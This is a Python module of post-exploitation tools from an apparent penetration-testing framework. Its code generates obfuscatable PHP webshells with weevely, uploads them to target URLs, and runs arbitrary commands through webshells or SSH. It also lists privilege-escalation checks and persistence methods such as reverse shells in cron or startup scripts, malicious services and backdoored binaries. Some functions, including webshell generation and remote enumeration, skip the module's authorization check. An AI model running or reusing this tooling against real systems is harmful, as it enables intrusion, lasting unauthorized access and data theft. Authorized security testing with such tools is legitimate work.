"""
Post-Exploitation Tools

Provides post-exploitation capabilities for authorized penetration testing.
ALL OPERATIONS IN THIS MODULE REQUIRE EXPLICIT AUTHORIZATION.
"""

import subprocess
import os
import re
from typing import Dict, Any, List, Optional

from ..security import OperationType, get_security_manager, Authorizer


class PostTools:
    """Post-exploitation tools for authorized penetration testing"""

    def __init__(self):
        self.security = get_security_manager()
        self.operation_type = OperationType.POST_EXPLOIT
        self.authorizer = Authorizer(self.security)

    def webshell_connect(self, url: str, password: Optional[str] = None) -> Dict[str, Any]:
        """
        Connect to a webshell

        WARNING: Requires explicit authorization

        Args:
            url: Webshell URL
            password: Optional password for protected webshell

        Returns:
            Dictionary with connection results
        """
        if self.authorizer.requires_authorization(self.operation_type):
            return {
                "success": False,
                "authorization_required": True,
                "message": self.authorizer.request_authorization(
                    self.operation_type, "webshell", url,
                    {"password": "***"}
                )
            }

        try:
            import requests

            # Basic connection test
            response = requests.get(url, timeout=10)

            self.security.log_operation(
                self.operation_type, "webshell_connect", url,
                {"has_password": password is not None},
                f"connected - status: {response.status_code}"
            )

            return {
                "success": True,
                "url": url,
                "status_code": response.status_code,
                "content_preview": response.text[:500],
                "server": response.headers.get("Server", "Unknown"),
                "note": "Interactive shell session not implemented - use curl or manual connection"
            }

        except ImportError:
            return {
                "success": False,
                "error": "Requests library not available"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def webshell_execute(self, url: str, command: str,
                         password: str) -> Dict[str, Any]:
        """
        Execute command through webshell using weevely

        WARNING: Requires explicit authorization

        Args:
            url: Webshell URL
            command: Command to execute
            password: Password for the webshell (REQUIRED)

        Returns:
            Dictionary with execution results
        """
        if not password:
            return {
                "success": False,
                "error": "Password is required for weevely webshell connection"
            }

        if self.authorizer.requires_authorization(self.operation_type):
            return {
                "success": False,
                "authorization_required": True,
                "message": self.authorizer.request_authorization(
                    self.operation_type, "weevely_exec", url,
                    {"command": command}
                )
            }

        try:
            # Check if weevely is installed
            check_cmd = ["which", "weevely"]
            result = subprocess.run(check_cmd, capture_output=True, text=True)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": "weevely not found. Install with: sudo apt install weevely"
                }

            # Build weevely command
            cmd = ["weevely", url, password, command]

            # Execute command through weevely
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120  # 2 minutes timeout for command execution
            )

            output = result.stdout
            stderr = result.stderr

            # Combine stdout and stderr for output
            full_output = output + stderr

            self.security.log_operation(
                self.operation_type, "weevely_exec", url,
                {"command": command},
                f"executed - exit: {result.returncode}"
            )

            return {
                "success": True,
                "tool": "weevely",
                "url": url,
                "command": command,
                "exit_code": result.returncode,
                "output": full_output[:10000] if len(full_output) > 10000 else full_output,
                "output_length": len(full_output),
                "message": f"Command executed with exit code {result.returncode}"
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Command execution timed out after 2 minutes"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def generate_webshell(self, password: str, filename: str = "shell.php",
                         obfuscate: bool = False) -> Dict[str, Any]:
        """
        Generate a webshell using weevely tool

        WARNING: For authorized testing only

        Args:
            password: Password for the webshell (REQUIRED)
            filename: Output filename (default: shell.php)
            obfuscate: Obfuscate the webshell code

        Returns:
            Dictionary with generation results
        """
        if not password:
            return {
                "success": False,
                "error": "Password is required for weevely webshell generation"
            }

        try:
            # Check if weevely is installed
            check_cmd = ["which", "weevely"]
            result = subprocess.run(check_cmd, capture_output=True, text=True)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": "weevely not found. Install with: sudo apt install weevely"
                }

            # Build weevely generate command
            cmd = ["weevely", "generate", password, filename]

            # Change to a writable directory (project directory)
            import os
            original_dir = os.getcwd()
            target_dir = os.path.expanduser("~/kali")

            # Create directory if it doesn't exist
            os.makedirs(target_dir, exist_ok=True)

            os.chdir(target_dir)

            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )

                output = result.stdout.strip()
                stderr = result.stderr.strip()

                # If no stdout, check stderr
                if not output and stderr:
                    output = stderr

                # Parse weevely output: "Generated 'test.php' with password '123' of 692 byte size."
                # Extract actual size from weevely output
                size_pattern = r"of (\d+) byte size"
                size_match = re.search(size_pattern, output)

                # Check if file was created
                file_path = os.path.join(target_dir, filename)

                # Debug: check if file exists
                if not os.path.exists(file_path):
                    return {
                        "success": False,
                        "error": f"Failed to generate webshell file",
                        "file_path_checked": file_path,
                        "target_dir": target_dir,
                        "weevely_output": output,
                        "weevely_stderr": stderr,
                        "weevely_exit_code": result.returncode,
                        "current_dir": os.getcwd(),
                        "note": "File was not created. Check weevely installation and permissions."
                    }

                if os.path.exists(file_path):
                    # Use size from weevely output if available, otherwise get from filesystem
                    if size_match:
                        file_size = int(size_match.group(1))
                    else:
                        file_size = os.path.getsize(file_path)

                    # Read the generated file with error handling for encoding
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            shell_content = f.read()
                    except UnicodeDecodeError:
                        # If UTF-8 fails, try latin-1 which accepts all byte values
                        with open(file_path, 'r', encoding='latin-1') as f:
                            shell_content = f.read()

                    self.security.log_operation(
                        self.operation_type, "weevely_generate", None,
                        {"password": password, "filename": filename, "size": file_size},
                        "success"
                    )

                    return {
                        "success": True,
                        "tool": "weevely",
                        "password": password,
                        "filename": filename,
                        "file_path": file_path,
                        "file_size": file_size,
                        "shell_preview": shell_content[:500] if len(shell_content) > 500 else shell_content,
                        "message": output,  # Return the actual weevely output message
                        "usage": f"Connect with: weevely <URL> {password}",
                        "warning": "⚠️ Use this webshell only for authorized security testing"
                    }
                else:
                    return {
                        "success": False,
                        "error": "Failed to generate webshell file",
                        "output": output
                    }

            finally:
                os.chdir(original_dir)

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Webshell generation timed out"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def webshell_upload(self, target_url: str, shell_code: str,
                        upload_path: str,
                        method: str = "form") -> Dict[str, Any]:
        """
        Attempt to upload a webshell to a target

        WARNING: Requires explicit authorization

        Args:
            target_url: Target URL for upload
            shell_code: Webshell code to upload
            upload_path: Path where webshell will be uploaded
            method: Upload method (form, put, mv)

        Returns:
            Dictionary with upload results
        """
        if self.authorizer.requires_authorization(self.operation_type):
            return {
                "success": False,
                "authorization_required": True,
                "message": self.authorizer.request_authorization(
                    self.operation_type, "webshell_upload", target_url,
                    {"path": upload_path}
                )
            }

        try:
            import requests
            import tempfile
            import os

            # Create temporary file for webshell
            with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
                f.write(shell_code)
                temp_file = f.name

            try:
                if method == "form":
                    # Try multipart form upload
                    with open(temp_file, 'rb') as f:
                        files = {'file': ('shell.php', f, 'application/x-php')}
                        response = requests.post(target_url, files=files, timeout=30)

                elif method == "put":
                    # Try PUT method
                    headers = {'Content-Type': 'application/x-php'}
                    response = requests.put(upload_path, data=shell_code, headers=headers, timeout=30)

                elif method == "mv":
                    # Try to move/rename uploaded file
                    response = requests.post(target_url, data={'file': temp_file, 'new_name': upload_path}, timeout=30)

                else:
                    return {
                        "success": False,
                        "error": f"Unsupported upload method: {method}"
                    }

                self.security.log_operation(
                    self.operation_type, "webshell_upload", target_url,
                    {"path": upload_path, "method": method},
                    f"attempted - status: {response.status_code}"
                )

                return {
                    "success": True,
                    "target_url": target_url,
                    "upload_path": upload_path,
                    "method": method,
                    "status_code": response.status_code,
                    "response": response.text[:1000] if len(response.text) > 1000 else response.text,
                    "note": "Upload attempted. Verify access by testing the uploaded webshell."
                }

            finally:
                os.unlink(temp_file)

        except ImportError:
            return {
                "success": False,
                "error": "Requests library not available"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def suggest_privilege_escalation(self, os_type: str = "linux") -> Dict[str, Any]:
        """
        Suggest privilege escalation vectors

        Args:
            os_type: Operating system type (linux, windows)

        Returns:
            Dictionary with suggestions
        """
        suggestions = []

        if os_type.lower() == "linux":
            suggestions = [
                {
                    "check": "Kernel version",
                    "command": "uname -a",
                    "description": "Check for known kernel exploits",
                    "exploitdb": "Search kernel version"
                },
                {
                    "check": "SUID files",
                    "command": "find / -perm -u=s -type f 2>/dev/null",
                    "description": "Find files with SUID bit set that might be exploitable"
                },
                {
                    "check": "Scheduled tasks",
                    "command": "crontab -l; ls -la /etc/cron*",
                    "description": "Check for weak cron jobs"
                },
                {
                    "check": "Writable directories",
                    "command": "find / -perm -o+w -type d 2>/dev/null",
                    "description": "Find world-writable directories"
                },
                {
                    "check": "Running processes",
                    "command": "ps aux",
                    "description": "Check for vulnerable services running as root"
                },
                {
                    "check": "LD_PRELOAD",
                    "description": "Try LD_PRELOAD hijacking if possible"
                },
                {
                    "check": "PATH variable",
                    "command": "echo $PATH",
                    "description": "Check for writable directories in PATH"
                },
                {
                    "check": "sudo configuration",
                    "command": "sudo -l",
                    "description": "Check what commands can be run as sudo"
                }
            ]
        elif os_type.lower() == "windows":
            suggestions = [
                {
                    "check": "System info",
                    "command": "systeminfo",
                    "description": "Check Windows version and patches"
                },
                {
                    "check": "User privileges",
                    "command": "whoami /priv",
                    "description": "Check current user privileges"
                },
                {
                    "check": "Scheduled tasks",
                    "command": "schtasks /query",
                    "description": "Enumerate scheduled tasks"
                },
                {
                    "check": "Services",
                    "command": "sc query",
                    "description": "Check service configuration for weaknesses"
                },
                {
                    "check": "AlwaysInstallElevated",
                    "command": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer",
                    "description": "Check if MSI can install as SYSTEM"
                }
            ]

        self.security.log_operation(
            self.operation_type, "priv_esc_suggestions", None,
            {"os_type": os_type}, "success"
        )

        return {
            "success": True,
            "os_type": os_type,
            "suggestions": suggestions
        }

    def suggest_persistence(self, os_type: str = "linux") -> Dict[str, Any]:
        """
        Suggest persistence mechanisms

        Args:
            os_type: Operating system type (linux, windows)

        Returns:
            Dictionary with persistence suggestions
        """
        persistence = []

        if os_type.lower() == "linux":
            persistence = [
                {
                    "method": "Cron job",
                    "command": "crontab -e",
                    "description": "Add reverse shell to cron",
                    "risk": "high"
                },
                {
                    "method": "SSH keys",
                    "command": "cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys",
                    "description": "Add SSH public key for persistent access",
                    "risk": "medium"
                },
                {
                    "method": "Systemd service",
                    "description": "Create malicious systemd service",
                    "risk": "high"
                },
                {
                    "method": "Startup script",
                    "command": "~/.bashrc, ~/.profile",
                    "description": "Add reverse shell to user startup scripts",
                    "risk": "medium"
                },
                {
                    "method": "Backdoor binary",
                    "description": "Replace common binary with backdoored version",
                    "risk": "critical"
                }
            ]
        elif os_type.lower() == "windows":
            persistence = [
                {
                    "method": "Registry Run key",
                    "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "description": "Add payload to registry Run key",
                    "risk": "high"
                },
                {
                    "method": "Scheduled task",
                    "command": "schtasks /create",
                    "description": "Create scheduled task for persistence",
                    "risk": "high"
                },
                {
                    "method": "Startup folder",
                    "path": "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                    "description": "Place payload in startup folder",
                    "risk": "medium"
                },
                {
                    "method": "Service",
                    "command": "sc create",
                    "description": "Create Windows service",
                    "risk": "critical"
                }
            ]

        self.security.log_operation(
            self.operation_type, "persistence_suggestions", None,
            {"os_type": os_type}, "success"
        )

        return {
            "success": True,
            "os_type": os_type,
            "methods": persistence,
            "warning": "⚠️ All persistence methods are detectable and should only be used in authorized testing"
        }

    def port_forward(self, local_port: int, remote_host: str,
                     remote_port: int, bind_address: str = "127.0.0.1") -> Dict[str, Any]:
        """
        Set up port forwarding using SSH

        Args:
            local_port: Local port to bind
            remote_host: Remote host to forward to
            remote_port: Remote port to forward to
            bind_address: Local bind address

        Returns:
            Dictionary with port forwarding command
        """
        cmd = f"ssh -L {bind_address}:{local_port}:{remote_host}:{remote_port} -N <user>@<jump_host>"

        self.security.log_operation(
            self.operation_type, "port_forward", None,
            {
                "local_port": local_port,
                "remote_host": remote_host,
                "remote_port": remote_port
            }, "command provided"
        )

        return {
            "success": True,
            "command": cmd,
            "description": "Port forwarding command provided. Run manually to establish tunnel.",
            "parameters": {
                "local_port": local_port,
                "remote_host": remote_host,
                "remote_port": remote_port,
                "bind_address": bind_address
            }
        }

    def execute_remote(self, host: str, command: str,
                       method: str = "ssh") -> Dict[str, Any]:
        """
        Execute command on remote host

        WARNING: Requires explicit authorization

        Args:
            host: Remote host
            command: Command to execute
            method: Execution method (ssh, webshell)

        Returns:
            Dictionary with execution results
        """
        if self.authorizer.requires_authorization(self.operation_type):
            return {
                "success": False,
                "authorization_required": True,
                "message": self.authorizer.request_authorization(
                    self.operation_type, "remote_exec", host,
                    {"command": command, "method": method}
                )
            }

        try:
            if method == "ssh":
                cmd = ["ssh", host, command]

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )

                self.security.log_operation(
                    self.operation_type, "remote_exec", host,
                    {"command": command, "method": method},
                    f"executed - exit: {result.returncode}"
                )

                return {
                    "success": True,
                    "method": method,
                    "host": host,
                    "command": command,
                    "exit_code": result.returncode,
                    "stdout": result.stdout[:5000],
                    "stderr": result.stderr[:5000]
                }
            else:
                return {
                    "success": False,
                    "error": f"Method '{method}' not implemented"
                }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Command timed out"}
        except FileNotFoundError:
            return {"success": False, "error": "SSH client not found"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def enumerate_system(self, host: str, method: str = "ssh") -> Dict[str, Any]:
        """
        Enumerate remote system information

        Args:
            host: Remote host
            method: Enumeration method (ssh)

        Returns:
            Dictionary with system information
        """
        commands = {
            "os_info": "uname -a",
            "users": "cat /etc/passwd",
            "network": "ip addr",
            "processes": "ps aux",
            "installed_packages": "dpkg -l | head -50",
            "mounts": "mount | head -20"
        }

        results = {}

        for name, cmd in commands.items():
            try:
                result = subprocess.run(
                    ["ssh", host, cmd],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                results[name] = {
                    "command": cmd,
                    "output": result.stdout[:2000],
                    "exit_code": result.returncode
                }
            except Exception as e:
                results[name] = {"error": str(e)}

        self.security.log_operation(
            self.operation_type, "enumerate_system", host,
            {"method": method}, "success"
        )

        return {
            "success": True,
            "host": host,
            "enumeration": results
        }
